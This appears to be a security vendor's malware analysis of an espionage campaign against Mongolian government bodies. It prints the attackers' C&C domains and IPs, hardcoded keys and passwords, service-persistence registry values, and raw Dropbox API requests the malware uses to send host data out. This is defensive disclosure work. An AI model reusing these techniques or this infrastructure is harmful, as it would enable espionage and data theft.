class="mantine-Grid-col mantine-3816o2"><div class="mantine-Container-root mantine-i7qrnu" id="post" data-component="post-content"><div class="RichText_wrapper__xZRh7"><p><strong>Introduction&nbsp;</strong></p><p>This summer, Avast discovered a new APT campaign targeting government agencies and a National Data Center of Mongolia. We consider with moderate confidence based on our research that the chinese-speaking APT group LuckyMouse is behind the attack.&nbsp;</p><p>The APT group planted backdoors and keyloggers to gain long-term access to government networks and then uploaded a variety of tools that they used to perform additional activities on the compromised network such as scanning of the local network and dumping credentials. We presume that the main aim of cyber-espionage was the exfiltration of sensitive data from potentially interesting government agencies.</p><p>According to our local telemetries, we consider that the government institutions were attacked in two ways. One was through a vulnerable company who is providing services for these agencies, and the other was through an email spear-phishing with a malicious attachment – a weaponized document using CVE-2017-11882.&nbsp;</p><p>There are many tactics that are consistent with other reports of LuckyMouse; nevertheless, we are also seeing some previously undocumented tactics indicating that the actors have updated their toolset with Polpo and LuckyBack backdoors. Our analysis below will highlight those new tactics.&nbsp;</p><p><strong>Attribution &amp; Clusterization</strong></p><p>We base our presumption that this campaign was led by the LuckyMouse APT group on the tooling that we found during the investigation of this campaign, most of them having previously been attributed to LuckyMouse by other researchers[<a href="https://securelist.com/luckymouse-hits-national-data-center/86083/">1</a>][<a href="https://securelist.com/luckymouse-ndisproxy-driver/87914/">2</a>][<a href="https://unit42.paloaltonetworks.com/emissary-panda-attacks-middle-east-government-sharepoint-servers/">3</a>].</p><p>In 2018, Kaspersky Labs released two blog posts about LuckyMouse targeting a national data center containing Asian government resources. Their blog posts described several tool sets such as network filtering driver NDISProxy, weaponized documents with CVE-2017-11882 (Microsoft Office Equation Editor, widely used by Chinese-speaking actors), and Earthworm tunneler. They also described a DLL sideloading technique abusing legitimate applications from Symantec (<em>IntgStat.exe</em>). This is a legitimate application that loads a DLL <em>pcalocalresloader.dll</em>. By sideloading their own version <em>pcalocalresloader.dll</em>, they load HyperBro RAT from a compressed and encrypted file<em> thumbs.db</em>. While some of the tools that were used were publicly known tools that are available on the internet, the group also developed their own tools, including a rootkit[<a href="https://securelist.com/luckymouse-hits-national-data-center/86083/">1</a>][<a href="https://securelist.com/luckymouse-ndisproxy-driver/87914/">2</a>].</p><p>In April 2019, PaloAlto Networks released a blogpost about LuckyMouse. According to the post, the group installed webshells on a SharePoint server to compromise Government Organizations in the Middle East. Similarly, the group used several publicly known and available tools (such as mimikatz, curl, ntbscan). But what got our attention was the fact that the same HyperBro RAT was used in the campaign we were analyzing. The APT attack we analyzed also used a DLL sideloading technique, although with different executables. The executable used was a Symantec application <em>thinprobe.exe</em> that loads <em>thinhostprobedll.dll</em>. This DLL was then used to sideload <em>thumb.db</em> that contained encrypted and compressed HyperBro[<a href="https://unit42.paloaltonetworks.com/emissary-panda-attacks-middle-east-government-sharepoint-servers/">3</a>].</p><p>We’ve also discovered a Polpo backdoor in the network belonging to the National Data Center of Mongolia. This backdoor was accompanied by samples that are known to be used by the LuckyMouse group which lead us to the conclusion that this backdoor is a new addition into LuckyMouse’s toolkit. We also observed more common tools, e.g. VMProtect-obfuscated Earthworm tunneler, a custom installer dropping NDISProxy network filtering driver, and various network scanners.</p><p><strong>Infection Chain</strong></p><p>We observed that this APT group was also targeting an unknown company that was providing services to government institutions in East Asia. The group infiltrated the company’s computers and managed to harvest credentials belonging to the company’s email accounts. Unfortunately, we haven’t been able to identify which attack vector was used in this infiltration. These credentials were then used to send emails from the hacked company’s email accounts to the government officials. While we were unable to recover the whole email, we’ve managed to recover the email’s header. The header indicates that these emails were asking the recipient to update a firmware, i.e. launch a self-extracting 7-zip archive attached to this email.</p><p>Date: Sun, 28 Jun 2020 20:43:08 +0800 (ULAT)&nbsp;<br>Subject: Re: Perform a firmware update on the server</p><p>XXXXXX_update.exe&nbsp;</p><p>(sha256:2D2EA3002C367684F21AD08BDC9B5079EBDEE08B6356AC5694EFA139D4C6E60D)</p><p>This archive drops three already familiar files – Symantec’s <em>thinprobe.exe</em>, malicious <em>thinhostprobedll.dll</em>, and <em>thumb.db</em>. The malicious DLL is used for DLL sideloading, decrypting and decompressing <em>thumb.db</em> and finally loading its processed content – a HyperBro RAT . This backdoor has also been reported on by <a href="https://securelist.com/luckymouse-hits-national-data-center/86083/">Kaspersky[1]</a> and <a href="https://unit42.paloaltonetworks.com/emissary-panda-attacks-middle-east-government-sharepoint-servers/">PaloAlto Networks[3]</a>, the latter providing an extensive description of the HyperBro RAT.</p></div><div class="mantine-Container-root mantine-1yr9cmk"><picture id="the-picture"><source srcSet="https://www.gendigital.com/blog/sites/default/files/styles/blogs_paragraph_image_large/public/2024-06/graph_dark.png.webp?itok=ctLjdMol 1x, infection vector" class="mantine-q24tb8"/></picture><div class="mantine-Text-root picture-caption mantine-rpndsl">Figure 1: Overview of infection vector</div></div><div class="RichText_wrapper__xZRh7"><p><strong>Toolset</strong></p><p>In this following section we describe a tool set we found on the victim’s PC, used by the APT group for cyber-espionage and lateral movement through the network. We could divide these tools into three categories:</p><ul><li>Helpers: ServiceInstaller, ShellCodeExecutor, DataExtractor 1/2, Information Collector</li><li>Remote access: StartServiceTool, Korplug, LuckyBack, BlueTraveller, Polpo</li><li>Publicly available tools: UAC bypass tool, port scanners, password dumpers, FRP, Earthworm tunneler</li></ul><p>In detail, we found the following tools:</p><h2><strong>StartServiceTool</strong></h2><p>This tool installs <em>wcm.dll</em> into <em>%WINDIR%\system32</em>, a registry record</p><p>HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\WindowsConnections Manager</p><p>is created with the following values:</p><p>Description: Makes automatic connect/disconnect decisions based on the network connectivity options currently available to the PC and enables management of network connectivity based on Group Policy settings.</p><p>DisplayName: Windows Connections Manager</p><p>ServiceDll: C:\Windows\system32\wcm.dll.</p><p>This effectively creates a new service. The dropped binary is a 32-bit service DLL that has two parts – embedded DLL, and mmLoader (<a href="http://tishion.github.io/mmLoader/">http://tishion.github.io/mmLoader/</a>), a loader that bypasses the windows loader.</p><p>The final payload DLL is written in GO and contains a single export named “Interface“. This function expects 4 arguments consisting of two strings and their corresponding lengths. The string values specify the victim ID and the Dropbox API key to use. The API key is passed in as an RC4 encrypted + base64 encoded value.<br>The hardcoded decryption key is “0000111122223333“. The DLL additionally contains a default API key which appears to be for the authors test account.</p><p>Initially, it tries do download a file from Dropbox via the HTTP API:</p><p>POST /2/files/download HTTP/1.1<br>Host: content.dropboxapi.com<br>User-Agent: Go-http-client/1.1<br>Content-Length: 0<br>Authorization: Bearer [snipped]<br>Dropbox-Api-Arg: {“path”: “/infos/000000.txt”}<br>Accept-Encoding: gzip</p><p>If the server responds with a file, it tries to upload a file with a timestamp and a hostname onto Dropbox:</p><p>POST /2/files/upload HTTP/1.1<br>Host: content.dropboxapi.com<br>User-Agent: Go-http-client/1.1<br>Content-Length: 36<br>Authorization: Bearer [snipped]<br>Content-Type: application/octet-stream<br>Dropbox-Api-Arg: {“path”: “/infos/116a0d.txt”,”mode”: “overwrite”,”autorename”: true,”mute”: false,”strict_conflict”: false}<br>Accept-Encoding: gzip</p><p>%currentDate% %currentTime%##%hostname%</p><p>Afterwards, a C&amp;C request-response loop is started. Based on the response from the C&amp;C server, one of the following commands is executed: download files, upload files, sleep, quit, or execute commands on a command line. See the following diagram for a detailed flow, keep in mind that all download/upload are using the aforementioned Dropbox API:</p></div><div class="mantine-Container-root mantine-1yr9cmk"><picture id="the-picture"><source srcSet="https://www.gendigital.com/blog/sites/default/files/styles/blogs_paragraph_image_large/public/2024-06/pasted%20image%200_20.png.webp?itok=6c767pnB 1x, https://www.gendigital.com/blog/sites/default/files/styles/blogs_paragraph_image_large_2x/public/2024-06/pasted%20image%200_20.png.webp?itok=pipbVt-N 2x" media="(min-width: 1020px)"/><source srcSet="https://www.gendigital.com/blog/sites/default/files/styles/blogs_paragraph_image_medium/public/2024-06/pasted%20image%200_20.png.webp?itok=vhd3NbWi 1x, https://www.gendigital.com/blog/sites/default/files/styles/blogs_paragraph_image_medium_2x/public/2024-06/pasted%20image%200_20.png.webp?itok=83G8UUy6 2x" media="(min-width: 720px)"/><source srcSet="https://www.gendigital.com/blog/sites/default/files/styles/blogs_paragraph_image_small/public/2024-06/pasted%20image%200_20.png.webp?itok=idPAQH2a 1x, https://www.gendigital.com/blog/sites/default/files/styles/blogs_paragraph_image_small_2x/public/2024-06/pasted%20image%200_20.png.webp?itok=wbr2tNfH 2x" media="(min-width: 420px)"/><img Overview of detailed execution flow" class="mantine-q24tb8"/></picture><div class="mantine-Text-root picture-caption mantine-rpndsl">Figure 2: Overview of detailed execution flow</div></div><div class="RichText_wrapper__xZRh7"><h2><strong>ServiceInstaller</strong></h2><p>We assume that this installer is intended to be executed by one of the aforementioned backdoors as it requires command-line parameters for its successful execution:</p></div><div class="mantine-Container-root mantine-1yr9cmk"><picture id="the-picture"><source srcSet="https://www.gendigital.com/blog/sites/default/files/styles/blogs_paragraph_image_large/public/2024-06/Screenshot%202024-06-24%20at%2011.14.41%E2%80%AFAM.png.webp?itok=P3ikbYIq 1x, https://www.gendigital.com/blog/sites/default/files/styles/blogs_paragraph_image_large_2x/public/2024-06/Screenshot%202024-06-24%20at%2011.14.41%E2%80%AFAM.png.webp?itok=CtstgIfR 2x" media="(min-width: 1020px)"/><source srcSet="https://www.gendigital.com/blog/sites/default/files/styles/blogs_paragraph_image_medium/public/2024-06/Screenshot%202024-06-24%20at%2011.14.41%E2%80%AFAM.png.webp?itok=Sb7-DO8b 1x, https://www.gendigital.com/blog/sites/default/files/styles/blogs_paragraph_image_medium_2x/public/2024-06/Screenshot%202024-06-24%20at%2011.14.41%E2%80%AFAM.png.webp?itok=jlIb9SVi 2x" https://www.gendigital.com/blog/sites/default/files/styles/blogs_paragraph_image_small_2x/public/2024-06/Screenshot%202024-06-24%20at%2011.14.41%E2%80%AFAM.png.webp?itok=vSCH0kUR 2x" height="unset" alt="" class="mantine-q24tb8"/></picture></div><div class="RichText_wrapper__xZRh7"><p>At first, security descriptors of both <em>%windir%\system32\ </em>and <em>%windir%\system32\drivers\ </em>changes to allow the current user to copy files to these locations. Then the installer copies a service executable to <em>%windir%\system32\</em> under a randomly generated name (4 alphanumeric characters).</p><p>Depending on whether a service named <em>DFS Replication</em> already exists in&nbsp;</p><p>HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Svchost netsvcs,</p><p>a new service called <em>DFS Replication </em>(if it does not exist) or <em>IAS Jet Database Access Service %number%</em> is created. More specifically, its parameters are:</p><p>Description: <em>“Configures Internet Authentication Service (IAS). If this service is stopped, the remote network access that requires user authentication will be unavailable. If this service is disabled, any services that explicitly depend on it will fail to start or (Retail) Replicates files among multiple PCs keeping them in sync. On Client, it is used to roam folders between PCs; on the server, it is used to provide high availability and local access across a wide area network (WAN). If the service is stopped, file replication does not occur, and the files on the server become out-of-date. If the service is disabled, any services that explicitly depend on it will not start.”</em><br>DisplayName: DFS Replication/IAS Jet Database Access Service %number%<br>ServiceDll: C:\Windows\system32\&lt;4 random alphanumeric characters&gt;.dll.<br>Tag: 0<br>Security: 0</p><h2><strong>ShellCodeExecutor</strong></h2><p>This utility takes hex-encoded shellcode as an argument and then proceeds to execute it. The code responsible for decoding and unpacking can be seen below:</p></div><div class="mantine-Container-root mantine-1yr9cmk"><picture id="the-picture"><source srcSet="https://www.gendigital.com/blog/sites/default/files/styles/blogs_paragraph_image_large/public/2024-06/pasted%20image%200-1_9.png.webp?itok=ZnZYFm7r 1x, https://www.gendigital.com/blog/sites/default/files/styles/blogs_paragraph_image_large_2x/public/2024-06/pasted%20image%200-1_9.png.webp?itok=4i9Agu2C 2x" media="(min-width: 1020px)"/><source srcSet="https://www.gendigital.com/blog/sites/default/files/styles/blogs_paragraph_image_medium/public/2024-06/pasted%20image%200-1_9.png.webp?itok=K9Z-wfU8 1x, https://www.gendigital.com/blog/sites/default/files/styles/blogs_paragraph_image_medium_2x/public/2024-06/pasted%20image%200-1_9.png.webp?itok=VALrHg_d 2x" media="(min-width: 720px)"/><source srcSet="https://www.gendigital.com/blog/sites/default/files/styles/blogs_paragraph_image_small/public/2024-06/pasted%20image%200-1_9.png.webp?itok=nWTsGRKJ 1x, https://www.gendigital.com/blog/sites/default/files/styles/blogs_paragraph_image_small_2x/public/2024-06/pasted%20image%200-1_9.png.webp?itok=HdQYhqW9 2x" media="(min-width: 420px)"/><img src="https://www.gendigital.com/blog/sites/default/files/styles/blogs_paragraph_image_small/public/2024-06/pasted%20image%200-1_9.png.webp?itok=nWTsGRKJ" width="100%" height="unset" alt="Figure 3: Decoding algorithm and executing decoded payload in allocated memory" class="mantine-q24tb8"/></picture><div class="mantine-Text-root picture-caption mantine-rpndsl">Figure 3: Decoding algorithm and executing decoded payload in allocated memory</div></div><div class="RichText_wrapper__xZRh7"><p>While we weren’t able to reconstruct which stage this executor was used, we were able to recover its parameter that corresponds to a hex-encoded metasploit-generated shellcode (reverse HTTP proxy – <a href="https://github.com/rapid7/metasploit-framework/blob/master/external/source/shellcode/windows/x86/src/block/block_reverse_https_proxy.asm">Github</a> configured to connect to URL <em>oss.chrome-upgrade[.]com</em> (202.59.9[.]58). We suspect that the threat actors used the shellcode just to retrieve and execute a further stage from the C&amp;C server.</p><h2><strong>DataExtractor 1</strong></h2><p>This tool can be used to gather potentially sensitive documents with <em>pdf</em>,<em> ppt</em>,<em> xls</em>, and <em>doc</em> file extensions. It recursively scans all connected drives for such documents that were modified in 2020 and later. Gathered documents are packed using Winrar and the archive is protected with a password <em>“zaq1xsw@cde3</em>”. This archive will be then saved to <em>C:\MSBuild\NVIDIA\ </em>under a filename <em>CRYPTO-%computerName%-%number_value%.SYS</em>. This scan is repeated every 20 minutes. If this tool is launched a second time (e.g. after reboot), only documents that were modified in the last 24 hours are gathered.</p><p>After each run, a file <em>%windir%\system32\igfxme.vbs </em>is executed. Since this tool did not contain any exfiltration-related functionality, we presume that this script is used to exfiltrate the archive from the computer to a C&amp;C. Unfortunately, we were not able to recover this script.</p><h2><strong>DataExtractor 2</strong></h2><p>This binary is a simple filescanner that is provided with a list of file extensions, a list of directories, and date boundaries as parameters. Every directory from the list is searched for files with a given file extension. If such files are found and their modification date is within the provided date boundaries (in UTC), their full paths are written down into the output file. These paths are delimited by Windows line delimiters and they are encoded in 16-bit Unicode.</p><p>Below you will see a part of an error message, providing us the information about how this utility is used:</p><p><em>T040ClientLite.exe suffix .txt,.xls scanDirs E:\\test,E:\\test1 output E:\\test\\output.txt startEditDate 2020/04/26 endEditDate 2020/04/27</em></p><p>More generally, the command’s format is:</p><p><em>T040ClientLite.exe suffix &lt;file extensions&gt; scanDirs &lt;directories&gt; output &lt;output file&gt; startEditDate &lt;date&gt; endEditDate &lt;date&gt;</em></p><h2><strong>Information Collector</strong></h2><p>The Information Collector focuses on removable drives. If no such drives are connected, its execution is terminated. The collector fingerprints those drives (serial number, vendor ID, product ID), encrypts this data with a 64 byte XOR key, and stores it onto the system drive as hidden files. More specifically, it uses the following directories:</p><p><em>C:\MSBuild\Resources\Format\S-1-1</em> (encrypted files)</p><p><em>C:\MSBuild\Resources\Format\S-1-0\S-1-0-0 (unencrypted temporary files, deleted after encryption)</em></p></div><div class="mantine-Container-root mantine-1yr9cmk"><picture id="the-picture"><source srcSet="https://www.gendigital.com/blog/sites/default/files/styles/blogs_paragraph_image_large/public/2024-06/pasted%20image%200-2_5.png.webp?itok=Dkmnt8U5 1x, https://www.gendigital.com/blog/sites/default/files/styles/blogs_paragraph_image_large_2x/public/2024-06/pasted%20image%200-2_5.png.webp?itok=UB-PKObF 2x" media="(min-width: 1020px)"/><source srcSet="https://www.gendigital.com/blog/sites/default/files/styles/blogs_paragraph_image_medium/public/2024-06/pasted%20image%200-2_5.png.webp?itok=x_6XjuCY 1x, https://www.gendigital.com/blog/sites/default/files/styles/blogs_paragraph_image_medium_2x/public/2024-06/pasted%20image%200-2_5.png.webp?itok=Bm2qub73 2x" media="(min-width: 720px)"/><source srcSet="https://www.gendigital.com/blog/sites/default/files/styles/blogs_paragraph_image_small/public/2024-06/pasted%20image%200-2_5.png.webp?itok=ITBvJj_- 1x, https://www.gendigital.com/blog/sites/default/files/styles/blogs_paragraph_image_small_2x/public/2024-06/pasted%20image%200-2_5.png.webp?itok=sV01F9Is 2x" media="(min-width: 420px)"/><img src="https://www.gendigital.com/blog/sites/default/files/styles/blogs_paragraph_image_small/public/2024-06/pasted%20image%200-2_5.png.webp?itok=ITBvJj_-" width="100%" height="unset" alt="Figure 4: Sample enumerate drives, checking their type with GetDriveTypeA" class="mantine-q24tb8"/></picture><div class="mantine-Text-root picture-caption mantine-rpndsl">Figure 4: Sample enumerate drives, checking their type with GetDriveTypeA</div></div><div class="RichText_wrapper__xZRh7"><p><em>It ensures its persistence by adding itself into Run (SOFTWARE\Microsoft\Windows\CurrentVersion\Run) registry key under AvpSecurity.</em></p><p>Interestingly, it contains many unused functions using command-line tools such as: systeminfo, arp, ipconfig, netstat, and tasklist. It also supports archiving the collected information using WinRAR with a hard-coded password “1qaz@WSX”. The sample has no networking capabilities. It primarily serves for collecting the information and transferring the gathered information using removable drives between the machines in the network.</p><p>Moreover, the particular sample we analyzed contained a bug in the drives’ enumeration routine that made it virtually useless as it hampered all the sample’s functionality.</p><h2><strong>RAT</strong></h2><h3><strong>Korplug (PlugX)</strong></h3><p>Korplug (PlugX) is a well-known Remote Access Trojan associated with Chinese speaking attackers and it has been used in a large number of targeted attacks since 2012[<a href="https://www.welivesecurity.com/2014/11/12/korplug-military-targeted-attacks-afghanistan-tajikistan/">4</a>]. It uses DLL side-loading to load itself into the memory through legitimate applications. It helps it stay unnoticed by any security product. Korplug is a fully featured RAT, with capabilities such as file uploads, downloads, keystroke logging, webcam control and access to a remote cmd.exe shell.&nbsp;</p><p>In our case, we observed that it was loaded through an application provided by ESET called unsecapp.exe that was signed with a valid, but expired certification. After executing unsecapp.exe, it loads a malicious DLL <em>http_dll.dll</em>. This DLL, in turn, decrypts <em>http_dll.dat</em> with a custom algorithm, yielding Korplug which is then loaded into the memory and executed. Unfortunately, we were not able to trace the RAT back to the original payload that dropped and executed these files.</p><p>Address of C&amp;C servers:&nbsp;</p><p>web[.]microlynconline[.]com:80<br>home[.]microlynconline[.]com:8000<br>help[.]microlynconline[.]com:443<br>host[.]microlynconline[.]com:53</p><h2><strong>Backdoors</strong></h2><p>We found three different backdoors in the government office network, two of which, PolPo and LuckyBack, were never seen in any previous campaign. Polpo also hits the National Data Center, and the two others, BlueTraveller and LuckyBack, only hit the government office network.</p><h3><strong>LuckyBack</strong></h3><p>LuckyBack collects the computer’s fingerprint, at first, and then tries to establish a communication with the C&amp;C server (45.77.55[.]145). Once the communication is established, the backdoor starts listening for commands. It is capable of: starting a remote shell, file manipulation (move, read, write, execute, get file size), keylogging, and screen capturing.</p><h4><strong>Technical:</strong></h4><p>At first, the used code page is retrieved by calling <em>chcp</em>, a command providing the keyboard and character set information, on the system drive.</p><p>The first request on the C&amp;C server “registers” the device by providing its fingerprint. Namely, the fingerprint is constructed from: PID, Windows version/build number, CPU architecture, username, user privileges, hostname, IP address, code page, and RDP session ID.</p><p>If the server accepts the registration, it responds with the PID and a simple string “OK”. Afterwards, a simple request-response C&amp;C loop is started, and commands and their corresponding numbers are displayed in the table below:</p></div><div class="mantine-Container-root mantine-1yr9cmk"><picture id="the-picture"><source srcSet="https://www.gendigital.com/blog/sites/default/files/styles/blogs_paragraph_image_large/public/2024-06/Screenshot%202024-06-24%20at%2011.16.12%E2%80%AFAM.png.webp?itok=rkBb9MIg 1x, https://www.gendigital.com/blog/sites/default/files/styles/blogs_paragraph_image_large_2x/public/2024-06/Screenshot%202024-06-24%20at%2011.16.12%E2%80%AFAM.png.webp?itok=o7mRzH5Y 2x" media="(min-width: 1020px)"/><source srcSet="https://www.gendigital.com/blog/sites/default/files/styles/blogs_paragraph_image_medium/public/2024-06/Screenshot%202024-06-24%20at%2011.16.12%E2%80%AFAM.png.webp?itok=qkIFjWso 1x, https://www.gendigital.com/blog/sites/default/files/styles/blogs_paragraph_image_medium_2x/public/2024-06/Screenshot%202024-06-24%20at%2011.16.12%E2%80%AFAM.png.webp?itok=2sElrukP 2x" media="(min-width: 720px)"/><source srcSet="https://www.gendigital.com/blog/sites/default/files/styles/blogs_paragraph_image_small/public/2024-06/Screenshot%202024-06-24%20at%2011.16.12%E2%80%AFAM.png.webp?itok=nDreIZHV 1x, https://www.gendigital.com/blog/sites/default/files/styles/blogs_paragraph_image_small_2x/public/2024-06/Screenshot%202024-06-24%20at%2011.16.12%E2%80%AFAM.png.webp?itok=565sIU4S 2x" media="(min-width: 420px)"/><img src="https://www.gendigital.com/blog/sites/default/files/styles/blogs_paragraph_image_small/public/2024-06/Screenshot%202024-06-24%20at%2011.16.12%E2%80%AFAM.png.webp?itok=nDreIZHV" width="100%" height="unset" alt="" class="mantine-q24tb8"/></picture></div><div class="RichText_wrapper__xZRh7"><h3><strong>BlueTraveller</strong></h3><p>This backdoor is simpler in terms of commands than the previous one. It accepts just four commands: exit, upload, download, and execute on the command line. Nevertheless, it uses two layers of C&amp;C servers, meaning that the first request is on the first layer, and it yields an IP address of a C&amp;C server from the second layer. Afterwards, the request-response C&amp;C loop uses the second layer. If the backdoor receives a command for the command line, the output from the console is encrypted with AES-256 and sent back to the second-layer C&amp;C server.</p><p>The binary itself has its strings encrypted with RC4, using a hardcoded key “L!Q@W#E$R%T^Y&amp;U*A|}t~k”. Among these strings, we may find the address of the first-layer C&amp;C server and the user agent that should be used for these requests. Our sample tried to contact <a href="https://decoded.avast.io/luigicamastra/apt-group-targeting-governmental-agencies-in-east-asia/blank">http://go.vegispaceshop[.]org/shop.htm</a>. The response seems to be pretty inconspicuous at first glance. But once we have a look more closely, we see that many lines are followed by a mixture of tabs and spaces,which is rather fishy indeed. And surprisingly this is where the IP address of the second C&amp;C layer hides!</p></div><div class="mantine-Container-root mantine-1yr9cmk"><picture id="the-picture"><source srcSet="https://www.gendigital.com/blog/sites/default/files/styles/blogs_paragraph_image_large/public/2024-06/pasted%20image%200-3_3.png.webp?itok=YbDlWU-q 1x, https://www.gendigital.com/blog/sites/default/files/styles/blogs_paragraph_image_large_2x/public/2024-06/pasted%20image%200-3_3.png.webp?itok=gY262O1B 2x" media="(min-width: 1020px)"/><source srcSet="https://www.gendigital.com/blog/sites/default/files/styles/blogs_paragraph_image_medium/public/2024-06/pasted%20image%200-3_3.png.webp?itok=SuECBVm0 1x, https://www.gendigital.com/blog/sites/default/files/styles/blogs_paragraph_image_medium_2x/public/2024-06/pasted%20image%200-3_3.png.webp?itok=aI6D7RDJ 2x" media="(min-width: 720px)"/><source srcSet="https://www.gendigital.com/blog/sites/default/files/styles/blogs_paragraph_image_small/public/2024-06/pasted%20image%200-3_3.png.webp?itok=AanFe0u5 1x, https://www.gendigital.com/blog/sites/default/files/styles/blogs_paragraph_image_small_2x/public/2024-06/pasted%20image%200-3_3.png.webp?itok=L9Dv_CbZ 2x" media="(min-width: 420px)"/><img src="https://www.gendigital.com/blog/sites/default/files/styles/blogs_paragraph_image_small/public/2024-06/pasted%20image%200-3_3.png.webp?itok=AanFe0u5" width="100%" height="unset" alt="Figure 5: Response from first layer of C&amp;C server" class="mantine-q24tb8"/></picture><div class="mantine-Text-root picture-caption mantine-rpndsl">Figure 5: Response from first layer of C&amp;C server</div></div><div class="mantine-Container-root mantine-1yr9cmk"><picture id="the-picture"><source srcSet="https://www.gendigital.com/blog/sites/default/files/styles/blogs_paragraph_image_large/public/2024-06/pasted%20image%200-4_0.png.webp?itok=-icyy2Nk 1x, https://www.gendigital.com/blog/sites/default/files/styles/blogs_paragraph_image_large_2x/public/2024-06/pasted%20image%200-4_0.png.webp?itok=n2aND08Q 2x" media="(min-width: 1020px)"/><source srcSet="https://www.gendigital.com/blog/sites/default/files/styles/blogs_paragraph_image_medium/public/2024-06/pasted%20image%200-4_0.png.webp?itok=gKR5c1WE 1x, https://www.gendigital.com/blog/sites/default/files/styles/blogs_paragraph_image_medium_2x/public/2024-06/pasted%20image%200-4_0.png.webp?itok=jFG5u5wn 2x" media="(min-width: 720px)"/><source srcSet="https://www.gendigital.com/blog/sites/default/files/styles/blogs_paragraph_image_small/public/2024-06/pasted%20image%200-4_0.png.webp?itok=qcYJdIDI 1x, https://www.gendigital.com/blog/sites/default/files/styles/blogs_paragraph_image_small_2x/public/2024-06/pasted%20image%200-4_0.png.webp?itok=86J1cuLv 2x" media="(min-width: 420px)"/><img src="https://www.gendigital.com/blog/sites/default/files/styles/blogs_paragraph_image_small/public/2024-06/pasted%20image%200-4_0.png.webp?itok=qcYJdIDI" width="100%" height="unset" alt="Figure 6: Script which decrypts the white spaces from the html response" class="mantine-q24tb8"/></picture><div class="mantine-Text-root picture-caption mantine-rpndsl">Figure 6: Script which decrypts the white spaces from the html response</div></div><div class="RichText_wrapper__xZRh7"><p>The BlueTraveller uses the same scheme for encryption – AES-256 with a key derived from a string that is hashed with SHA-256, providing the IV and the key. The first usage of this encryption is in the first request to the second-layer C&amp;C. For this first request, the key is derived from a string “<em>0304276cf4f31345“</em>. The key is then used to encrypt the generated GUID and the computer’s hostname which are then Base64-encoded and used to generate the request URL:&nbsp;&nbsp;</p><p><em>http://&lt;second_layer_C&amp;C&gt;/home/&lt;rand number&gt;/&lt;enc_length&gt;/&lt;Base64 data&gt;.</em></p><p>After this request is executed, commands are retrieved from:</p><p><em>http://&lt;second_layer_C&amp;C&gt;/index.htm.</em></p><p>The obtained data is encrypted with AES-256, using the aforementioned approach with GUID as a base-string for the key-derivation procedure. Each response also contains the random number that was sent in the first second-layer request. The malware checks whether the received number matches the one it sent; in case of a mismatch, the command is discarded. If a command for the command line is received, the output of the executed command (AES-256 encrypted, using the same key as the previous response, and Base64 encoded) is sent to</p><p>http://&lt;second_layer_C&amp;C&gt;/help/&lt;rand number&gt;/&lt;enc_length&gt;/&lt;Base64 data&gt;.</p><h3><strong>Polpo</strong></h3><p>Polpo is a backdoor that we’ve been seeing in the wild since 2018. It supports around 15 different commands including information collection and exfiltration, file transfer, and proxy connections.</p></div><div class="mantine-Container-root mantine-1yr9cmk"><picture id="the-picture"><source srcSet="https://www.gendigital.com/blog/sites/default/files/styles/blogs_paragraph_image_large/public/2024-06/Screenshot%202024-06-24%20at%2011.17.53%E2%80%AFAM.png.webp?itok=U_-OecMZ 1x, https://www.gendigital.com/blog/sites/default/files/styles/blogs_paragraph_image_large_2x/public/2024-06/Screenshot%202024-06-24%20at%2011.17.53%E2%80%AFAM.png.webp?itok=iBUNhI5F 2x" media="(min-width: 1020px)"/><source srcSet="https://www.gendigital.com/blog/sites/default/files/styles/blogs_paragraph_image_medium/public/2024-06/Screenshot%202024-06-24%20at%2011.17.53%E2%80%AFAM.png.webp?itok=3UvPQqtd 1x, https://www.gendigital.com/blog/sites/default/files/styles/blogs_paragraph_image_medium_2x/public/2024-06/Screenshot%202024-06-24%20at%2011.17.53%E2%80%AFAM.png.webp?itok=dkSRHqIX 2x" media="(min-width: 720px)"/><source srcSet="https://www.gendigital.com/blog/sites/default/files/styles/blogs_paragraph_image_small/public/2024-06/Screenshot%202024-06-24%20at%2011.17.53%E2%80%AFAM.png.webp?itok=CXNvBHFk 1x, https://www.gendigital.com/blog/sites/default/files/styles/blogs_paragraph_image_small_2x/public/2024-06/Screenshot%202024-06-24%20at%2011.17.53%E2%80%AFAM.png.webp?itok=c_quDen8 2x" media="(min-width: 420px)"/><img src="https://www.gendigital.com/blog/sites/default/files/styles/blogs_paragraph_image_small/public/2024-06/Screenshot%202024-06-24%20at%2011.17.53%E2%80%AFAM.png.webp?itok=CXNvBHFk" width="100%" height="unset" alt="" class="mantine-q24tb8"/></picture></div><div class="RichText_wrapper__xZRh7"><p>Base64-encoded addresses of C&amp;C servers are hard-coded in the binary</p><h4><strong>Polpo – Communication</strong></h4><p>The backdoor mimics the HTTP protocol to blend with the normal traffic. The transferred data is encrypted with AES and encoded into Base64 then sent as a part of fake HTML content.&nbsp;</p></div><div class="mantine-Container-root mantine-1yr9cmk"><picture id="the-picture"><source srcSet="https://www.gendigital.com/blog/sites/default/files/styles/blogs_paragraph_image_large/public/2024-06/pasted%20image%200-5.png.webp?itok=cRaPiHhy 1x, https://www.gendigital.com/blog/sites/default/files/styles/blogs_paragraph_image_large_2x/public/2024-06/pasted%20image%200-5.png.webp?itok=ocTB3660 2x" media="(min-width: 1020px)"/><source srcSet="https://www.gendigital.com/blog/sites/default/files/styles/blogs_paragraph_image_medium/public/2024-06/pasted%20image%200-5.png.webp?itok=S99mcGBv 1x, https://www.gendigital.com/blog/sites/default/files/styles/blogs_paragraph_image_medium_2x/public/2024-06/pasted%20image%200-5.png.webp?itok=7qm6F20m 2x" media="(min-width: 720px)"/><source srcSet="https://www.gendigital.com/blog/sites/default/files/styles/blogs_paragraph_image_small/public/2024-06/pasted%20image%200-5.png.webp?itok=Vpq8Xs-w 1x, https://www.gendigital.com/blog/sites/default/files/styles/blogs_paragraph_image_small_2x/public/2024-06/pasted%20image%200-5.png.webp?itok=Oyb5dSuK 2x" media="(min-width: 420px)"/><img Command data parsing" class="mantine-q24tb8"/></picture><div class="mantine-Text-root picture-caption mantine-rpndsl">Figure 7: Command data parsing</div></div><div class="RichText_wrapper__xZRh7"><p>The AES encryption key is derived from the first packet of each new command received from the C&amp;C server, using the algorithm below:</p></div><div class="mantine-Container-root mantine-1yr9cmk"><picture id="the-picture"><source srcSet="https://www.gendigital.com/blog/sites/default/files/styles/blogs_paragraph_image_large/public/2024-06/pasted%20image%200-6.png.webp?itok=ysuWnwXS 1x, https://www.gendigital.com/blog/sites/default/files/styles/blogs_paragraph_image_medium_2x/public/2024-06/pasted%20image%200-6.png.webp?itok=MJgH5ShM 